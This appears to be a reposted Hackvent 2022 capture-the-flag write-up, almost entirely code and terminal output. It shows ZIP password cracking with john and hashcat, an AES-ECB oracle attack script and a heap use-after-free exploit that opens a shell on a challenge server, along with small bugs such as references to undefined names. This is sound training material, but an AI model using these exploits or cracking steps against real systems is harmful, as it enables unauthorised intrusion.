# Hackvent 2022 – Hard

> 原文: https://www.ctfiot.com/89723.html
> ID: 89723


```
$ file message_1msps.cu8 
message_1msps.cu8: RDI Acoustic Doppler Current Profiler (ADCP)
```



```
oxdf@hacky$ python
Python 3.8.10 (default, Nov 14 2022, 12:59:47) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> with open('message_1msps.cu8', 'rb') as f:
... bytes = f.read()
... 
>>> from collections import Counter
>>> Counter(bytes)
Counter({127: 9321343, 128: 6066621, 126: 559355, 129: 207626, 125: 51129, 121: 43856, 134: 41072, 133: 35989, 130: 35258, 122: 32513, 132: 26601, 123: 25113, 124: 22279, 131: 22227, 120: 15795, 135: 7836, 119: 386, 136: 73})
```



```
ÿÿSFYyMnt2LXdpc2gtdi1nMHQtYjMzcn0=FYyMnt2LXdpc2gtdi1nMHQtYjMzcn00
```



```
$ echo SFYyMnt2LXdpc2gtdi1nMHQtYjMzcn0= | base64 -d
HV22{v-wish-v-g0t-b33r}
```



```
$ file haystack.png 
haystack.png: PNG image data, 24800 x 24800, 1-bit grayscale, non-interlaced
$ ls -lh haystack.png 
-rw-rw-r-- 1 oxdf oxdf 8.2M Dec 15 20:34 haystack.png
```



```
#!/usr/bin/env python3

from PIL import Image
import pyzbar.pyzbar as pyzbar
import sys

Image.MAX_IMAGE_PIXELS = 615050000

def get_qrs(im, div_by_arr):
 global count_img, count_codes
 width, height = im.size
 div_by = div_by_arr[0]

 sw, sh = width // div_by, height // div_by

 for y in range(0, height, sh):
 for x in range(0, width, sw):
 square = im.crop((x, y, x + sw, y + sh))
 count_img += 1
 if len(div_by_arr) > 1:
 get_qrs(square, div_by_arr[1:])

 codes = pyzbar.decode(square, symbols=[pyzbar.ZBarSymbol.QRCODE])
 for code in codes:
 count_counts += 1
 if code.data != b"Sorry, no flag here!":
 print(code.data)
 print(f'{count_img=}\n{count_codes=}')
 im.save('flag.png')
 #sys.exit()

im = Image.open('haystack.png')
im = im.crop((2400, 2400, 22400, 22400))

count_img, count_codes = 0, 0
get_qrs(im, [25, 2, 2, 2, 2, 2])
print(f'{count_img=}\n{count_codes=}')
```



```
oxdf@jawad:~/hv22-16$ time python solve.py 
b"HV22{1'm_y0ur_need13.}"
 count_img=437543
 count_codes=6979
Final:
 count_img=853125
 count_codes=14443

real 1m15.869s
user 1m15.487s
sys 0m0.369s
```



```
$ file SantasSleigh.raw 
SantasSleigh.raw: ASCII text, with very long lines, with no line terminators
$ wc SantasSleigh.raw
 0 1 6211 SantasSleigh.raw
```



```
$ grep -o . SantasSleigh.raw | sort | uniq -c
 226 0
 1146 1
 1865 2
 2974 3
```



```
xxxxxx69792b677e3e4c7a6d78545c205c4e5e26
```



```
$ file nice-list.zip 
nice-list.zip: Zip archive data, at least v?[0x333] to extract
```



```
$ 7z x nice-list.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 9 5900X 12-Core Processor (A20F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 554 bytes (1 KiB)

Extracting archive: nice-list.zip
--
Path = nice-list.zip
Type = zip
Physical Size = 554

 
Enter password (will not be echoed):
```



```
>>> bytes.fromhex('69792b677e3e4c7a6d78545c205c4e5e26')
b'iy+g~>LzmxT\\ \\N^&'
```



```
$ zip2john nice-list.zip | tee zip_hashes 
nice-list.zip/flag.txt:$zip2$*0*3*0*e07f14de6a21906d6353fd5f65bcb339*5664*41*e6f2437b18cd6bf346bab9beaa3051feba189a66c8d12b33e6d643c52d7362c9bb674d8626c119cb73146299db399b2f64e3edcfdaab8bc290fcfb9bcaccef695d*40663473539204e3cefd*$/zip2$:flag.txt:nice-list.zip:nice-list.zip
nice-list.zip/nice-list-2022.txt:$zip2$*0*3*0*a53ba8a665f2c94e798835ab626994dd*96cc*5b*72b0a11e9ef17568256695cf580c54400f41cfe0055f1b0800ff91374216313ff9b6dc2c9b1309f9765e3873122d8e422e2d9ecd2c7aa6cbf66105ce837a0fe46c18dc6ccc0cb25f59233c9223d699f43bc2e69c5117b307f813fc*6308b50240b2b882b61e*$/zip2$:nice-list-2022.txt:nice-list.zip:nice-list.zip
```



```
$ john --mask='?A?A?Aiy+g~>LzmxT\\ \\N^&' zip_hashes 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Loaded hashes with cost 1 (HMAC size) varying from 65 to 91 
Will run 4 OpenMP threads 
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
0g 0:00:00:04 2.44% (ETA: 22:01:26) 0g/s 66914p/s 135857c/s 135857C/s *niy+g~>LzmxT\ \N^&..aniy+g~>LzmxT\ \N^& 
4Ltiy+g~>LzmxT\ \N^& (nice-list.zip/nice-list-2022.txt) 
4Ltiy+g~>LzmxT\ \N^& (nice-list.zip/flag.txt) 
2g 0:00:00:08 DONE (2022-12-18 21:58) 0.2490g/s 69371p/s 138743c/s 138743C/s stiy+g~>LzmxT\ \N^&..eqtiy+g~>LzmxT\ \N^&
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```



```
$ hashcat -a 3 -m 13600 zip_hashes-hashcat "?b?b?biy+g~>LzmxT\ \N^&"
...[snip]...
$zip2$*0*3*0*a53ba8a665f2c94e798835ab626994dd*96cc*5b*72b0a11e9ef17568256695cf580c54400f41cfe0055f1b0800ff91374216313ff9b6dc2c9b1309f9765e3873122d8e422e2d9ecd2c7aa6cbf66105ce837a0fe46c18dc6ccc0cb25f59233c9223d699f43bc2e69c5117b307f813fc*6308b50240b2b882b61e*$/zip2$:4Ltiy+g~>LzmxT\ \N^&
$zip2$*0*3*0*e07f14de6a21906d6353fd5f65bcb339*5664*41*e6f2437b18cd6bf346bab9beaa3051feba189a66c8d12b33e6d643c52d7362c9bb674d8626c119cb73146299db399b2f64e3edcfdaab8bc290fcfb9bcaccef695d*40663473539204e3cefd*$/zip2$:4Ltiy+g~>LzmxT\ \N^&
...[snip]...
```



```
$ 7z x nice-list.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 9 5900X 12-Core Processor (A20F10),ASM,AES-NI)

Scanning the drive for archives:
1 file, 554 bytes (1 KiB)

Extracting archive: nice-list.zip
--
Path = nice-list.zip
Type = zip
Physical Size = 554

 
Enter password (will not be echoed):
Everything is Ok

Files: 2
Size: 175
Compressed: 554
```



```
$ cat flag.txt 
HV22{HAVING_FUN_WITH_CHOSEN_PREFIX_PBKDF2_HMAC_COLLISIONS_nzvwuj}
```



```
#!/usr/bin/env python3

from Crypto.Cipher import AES
from os import urandom

# pad block size to 16, zfill() fills on left. Invert the string to fill on right, then invert back.
def pad(msg):
 if len(msg) % 16 != 0:
 msg = msg[::-1].zfill(len(msg) - len(msg) % 16 + 16)[::-1]
 return msg

flag = open('flag.txt').read().strip()

while True:
 aes = AES.new(urandom(16), AES.MODE_ECB)
 msg = input("Enter access code:\n")
 enc = pad(msg) + pad(flag)
 enc = aes.encrypt(pad(enc.encode()))
 print(enc.hex())

 retry = input("Do you want to try again [y/n]:\n")
 if retry != "y":
 break
```



```
>>> len('?')
1
>>> len('?'.encode())
4
>>> len('❗'.encode())
3
>>> len('§'.encode())
2
```



```
#!/usr/bin/env python3

import string
import sys
from pwn import *

r = remote(sys.argv[1], 1337)

def probe(msg):
 r.sendlineafter(b"Enter access code:\n", msg)
 res = r.recvline().strip()
 r.sendlineafter(b"[y/n]:\n", b"y")
 return res

def pb(res):
 for line in zip(*(iter(res.decode()),)*32):
 print(''.join(line))

def get_flag_len():
 for i in range(1, 16):
 res = probe(('0'*16 + '§'*(i+1) + '0'*(16-i)).encode())
 print(i+1)
 pb(res)

 
def get_next_char(flag):
 for c in string.printable[:-6][::-1]:
 print(f'\r{c}{flag}', end='')
 payload = (c + flag[:15])
 payload += (16 - len(payload)) * '0'
 num_multi = (15 + len(flag)) % 16
 payload += '§' * num_multi + '0'* ((16-num_multi) % 16)
 res = probe(payload.encode())
 offset = ((len(flag) + 30) // 16) * -32
 if res[:32] == res[offset:][:32]:
 break
 else:
 assert False
 return c + flag

def get_next_char_fast(flag):
 payload = ''
 payload += ''.join(f'{c}{flag[:15]}'.ljust(16, '0') for c in string.printable[:-6])
 n = (len(flag) + 14) % 16 + 1
 payload += '§'*n + '0'*(16-n)
 res = probe(payload.encode())
 offset = ((len(flag) + 30) // 16) * -32
 return string.printable[res.index(res[offset:][:32])//32] + flag

flag = ''
while not flag.startswith('HV22{'):
 flag = get_next_char2(flag)
 print(f'\r{flag}', end='')

print()
```



```
$ python solve.py 152.96.7.9
[+] Opening connection to 152.96.7.9 on port 1337: Done
HV22{len()!=len()}
[*] Closed connection to 152.96.7.9 port 1337
```



```
$ file santasworkshop.elf 
santasworkshop.elf: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=14aac965f690be29c5d8a90a8e44e4316e703ce2, not stripped
```



```
$ nc 152.96.7.19 1337
Welcome to Santa's Workshop
Enjoy your stay but don't steal anything!
1 View naughty list
2 Check the workshop for items
3 Steal presents
4 Tell a good deed
>
```



```
#!/usr/bin/env python3

import sys
from pwn import *

r = remote(sys.argv[1], 1337)

# leak present address
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'the entry\n', b'-2147483644')
res = r.readuntil(b'>')
pie_leak = u64(res[:-2].ljust(8, b"\x00"))
present_addr = pie_leak - 0x309
success(f'Found present address: 0x{present_addr:08x}')

# free workshop
r.sendline(b'3')

# claim heap allocation
payload = "0xdf".ljust(40, "\x00").encode() + p64(present_addr)
r.sendlineafter(b'> ', b'4')
r.sendlineafter(b'deed?\n', b'48')
r.sendlineafter(b'deed\n', payload)

# trigger
r.sendlineafter(b'> ', b'2')
r.interactive()
```



```
$ python solve.py 152.96.7.2 
[+] Opening connection to 152.96.7.2 on port 1337: Done
[+] Found present addr: 55a2a13df98a
[*] Switching to interactive mode
 $ cd challenge
$ cat FLAG

 ############## ## #### #### ##############
 ## ## ###### ###### ## ## ##
 ## ###### ## ############## ## ###### ##
 ## ###### ## ## #### ## ## ###### ##
 ## ###### ## ######## ## ## ###### ##
 ## ## ## ## ## ## ## ##
 ############## ## ## ## ## ## ##############
 ## ###### ######
 ###### #### ###### ###### ######## ####
 #### #### ## #### ## ###### ####
 ###### ###### ## ## ## ## ####
 #### ## ## ## ## #### #### ##
 #### #### ## ###### ## ## ##
 ## ## ## #### ## ##
 #### ## ######## ######## ## ## ##
 ## ## #### #### ##########
 #### ######## ## ################ ##
 ## ######## ## ##
 ############## ## ## ## ## ## ##
 ## ## ###### ## ## #### ####
 ## ###### ## ## ###### ############ ######
 ## ###### ## ## ## ## ##
 ## ###### ## ###### ######## ## ##########
 ## ## ## #### ## ## ######
 ############## ## #### ###### ## ## ##
```
